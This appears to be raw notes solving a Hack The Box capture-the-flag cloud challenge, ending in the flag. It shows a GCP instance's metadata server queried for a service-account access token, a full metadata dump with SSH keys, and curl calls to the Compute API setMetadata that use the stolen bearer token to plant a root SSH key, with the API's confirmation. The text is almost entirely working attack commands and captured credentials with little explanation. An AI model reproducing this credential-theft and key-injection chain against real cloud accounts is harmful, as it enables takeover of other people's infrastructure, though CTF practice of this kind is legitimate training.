http://162.222.183.14:1337/
http://162.222.183.14:1338/
Role name: 

pdfme-role@essential-hawk-310212.iam.gserviceaccount.com 

http://metadata.google.internal/0.1/meta-data/service-accounts/pdfme-role@essential-hawk-310212.iam.gserviceaccount.com

http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token 

```json
{"access_token":"ya29.c.Ko8B-wdsVZauHD7adQJ8e4KOBiVYRFQTvx6Gyb3VVhu8iDhGtlkeQtwtdyXMA3Sbh8ICNA76ofg48ngNsrbSSOhSp_00LrBOzu78427H5NZUWnepqCxjq9XyLjRsOA8z19p_765YIBRTRTEDc4DV1tyQvXa292VBoLdPlYtwpRGICP98W9ol2cSh-FBSUAG-2JA","expires_in":3545,"token_type":"Bearer"}
```

https://secretmanager.googleapis.com/v1beta1/projects/essential-hawk-310212/secrets

'https://iam.googleapis.com/v1/projects/essential-hawk-310212/serviceAccounts'


http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true

```json
{"instance":{
    "attributes":{},"description":"","disks":[{"deviceName":"instance-1","index":0,"interface":"SCSI","mode":"READ_WRITE","type":"PERSISTENT-BALANCED"}],"guestAttributes":{},"hostname":"instance-1.c.essential-hawk-310212.internal","id":7397947137517811906,"image":"projects/debian-cloud/global/images/debian-10-buster-v20210316","licenses":[{"id":"5543610867827062957"}],"machineType":"projects/911957843158/machineTypes/e2-medium","maintenanceEvent":"NONE","name":"instance-1","networkInterfaces":[{"accessConfigs":[{"externalIp":"162.222.183.14","type":"ONE_TO_ONE_NAT"}],"dnsServers":["169.254.169.254"],"forwardedIps":[],"gateway":"10.128.0.1","ip":"10.128.0.2","ipAliases":[],"mac":"42:01:0a:80:00:02","mtu":1460,"network":"projects/911957843158/networks/default","subnetmask":"255.255.240.0","targetInstanceIps":[]}],"preempted":"FALSE","scheduling":{"automaticRestart":"TRUE","onHostMaintenance":"MIGRATE","preemptible":"FALSE"},"serviceAccounts":{"default":{"aliases":["default"],"email":"pdfme-role@essential-hawk-310212.iam.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/cloud-platform"]},"pdfme-role@essential-hawk-310212.iam.gserviceaccount.com":{"aliases":["default"],"email":"pdfme-role@essential-hawk-310212.iam.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/cloud-platform"]}},"tags":[],"zone":"projects/911957843158/zones/us-central1-a"},"oslogin":{"authenticate":{"sessions":{}}},"project":{"attributes":{"ssh-keys":"jr:ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABAEUOV4KIMTPjZyJ/B1bcSWqtWD5d0MspK8jobiSbrhZWoDIeuDCahSju6IjYzgX8ZJQjXP1iXZkMUsWcwMHzPYVbfpAv9qLeuZOF6vUrkiiFXPCCmJCqFH8BewWjYIlJfIBcWEIT/0C+HOQM1aMkdDkHrW2gLPvMUJOswHXMz/q0x2W9MKxtobXhl89qKD2jZGaLEOCpz3zFogRY8nG++Td3KqzX6X0tZx6ucUcon0iw4UiBoSDrnmqWjnR147fGtrmMGT73tAgiTprv/WMoS3SmIMQA5E0n9ef6iJHgZfhcIsFVl1Rf6aOml5dja6B8T3n0skKMhopufRSyob480dc= google-ssh{\"userName\":\"makelarisjr@hackthebox.eu\",\"expireOn\":\"2021-04-23T14:46:00+0000\"}\njr:ecdsa-sha2-nistp256AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFAPOmcooqFq9CzP2sz4MnDb54Mnj/JSnSvV8BDvXB+k4c9B6b1zVN6gqJLxKTKY4oPP1BAfhtpl1X5qeQH0+I= google-ssh{\"userName\":\"makelarisjr@hackthebox.eu\",\"expireOn\":\"2021-04-23T14:45:59+0000\"}\nunknown1:ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQDRnJrXGPgJi3sAmmtOIL1yiorFOQ4U9CIsI0OWds7izDtsPWXvinIQOpqxxWRXwdKc0Ye3vCN1L9imjmQ0ILN0UEQsCmZfxrlYBFsS8VpJbIwkewFSRTMirZ4IFN84twVWRHJiFZ0RGzIDlW8q/XA16iUygiS+ehGl/SyA9DwZwWZfLDRLkvj8O+widR6qlTu9juANWxO8klwsk06qilQ/k2y1dCzAI0LNGybmLHonaqJY35E80xSzZHPFDQIDSM1gYtGkcuiVGCE3VufdVhZHqGSI1L4MlPmjEnRlRGhINsoWl6eI0Ltw+QUdTh+zrQJvPhFg3NDbTILmRdL/m2LpxxQ9vG7pZmB41uRmkm+4UZgLPZiQGSWVaosbYADWXB6DXTBpMW5jatwtUtI3oiM6SdfC4DIdU/tlQ/L30MMhuds/V7om/izbxYGh2oKFgnVYGr5d5c3cMHTNfr8kjdn+TDQnEyRlBxUIOMd5pff4pzfyP4Pxorz03ZoEUruI4J8= unknown1@Macbook-makelaris.local\n"},"numericProjectId":911957843158,"projectId":"essential-hawk-310212"}}
```

https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1

`"fingerprint": "odlV6dDDlpg=",`

curl -X POST https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1/setMetadata -H "Authorization: Bearer ya29.c.Ko8B-wdsVZauHD7adQJ8e4KOBiVYRFQTvx6Gyb3VVhu8iDhGtlkeQtwtdyXMA3Sbh8ICNA76ofg48ngNsrbSSOhSp_00LrBOzu78427H5NZUWnepqCxjq9XyLjRsOA8z19p_765YIBRTRTEDc4DV1tyQvXa292VBoLdPlYtwpRGICP98W9ol2cSh-FBSUAG-2JA" -H "Content-Type: application/json" -d '{"items": [{"key": "ssh-keys","value": "root:ssh-rsa AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBAC64+99ME5Dd3la7fLo+rBBjG+UTVZ3ImkyUvJRL1DCZX3TqrnzBlExQq0iNSHy9H6CTAOqOAWY/gqR4NfcS55hrwFgQ6sTWTZd+x8vIGWALDX7R502l5RG3YFurlgAqoGT+vmXmSln0gVdWMzlq+ruABKlQ+xGNhiANMmxxhkM6Lzmnw== root"}],"fingerprint": "odlV6dDDlpg="}'

```bash
curl -X POST https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1/setMetadata -H "Authorization: Bearer ya29.c.Ko8B-wdsVZauHD7adQJ8e4KOBiVYRFQTvx6Gyb3VVhu8iDhGtlkeQtwtdyXMA3Sbh8ICNA76ofg48ngNsrbSSOhSp_00LrBOzu78427H5NZUWnepqCxjq9XyLjRsOA8z19p_765YIBRTRTEDc4DV1tyQvXa292VBoLdPlYtwpRGICP98W9ol2cSh-FBSUAG-2JA" -H "Content-Type: application/json" -d '{"items": [{"key": "ssh-keys","value": "root:ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBAC64+99ME5Dd3la7fLo+rBBjG+UTVZ3ImkyUvJRL1DCZX3TqrnzBlExQq0iNSHy9H6CTAOqOAWY/gqR4NfcS55hrwFgQ6sTWTZd+x8vIGWALDX7R502l5RG3YFurlgAqoGT+vmXmSln0gVdWMzlq+ruABKlQ+xGNhiANMmxxhkM6Lzmnw== root"}],"fingerprint": "qyBPaKY4gUw="}'
{
  "id": "7241600513931666928",
  "name": "operation-1619221279356-5c0ac552b379f-4c936f4c-587403ae",
  "zone": "https://www.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a",
  "operationType": "setMetadata",
  "targetLink": "https://www.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1",
  "targetId": "7397947137517811906",
  "status": "RUNNING",
  "user": "pdfme-role@essential-hawk-310212.iam.gserviceaccount.com",
  "progress": 0,
  "insertTime": "2021-04-23T16:41:19.748-07:00",
  "startTime": "2021-04-23T16:41:19.764-07:00",
  "selfLink": "https://www.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/operations/operation-1619221279356-5c0ac552b379f-4c936f4c-587403ae",
  "kind": "compute#operation"
}
```

`CHTB{l00k_4t_m3_n0w_I_0wn_4ll_th3_cl0ut!}`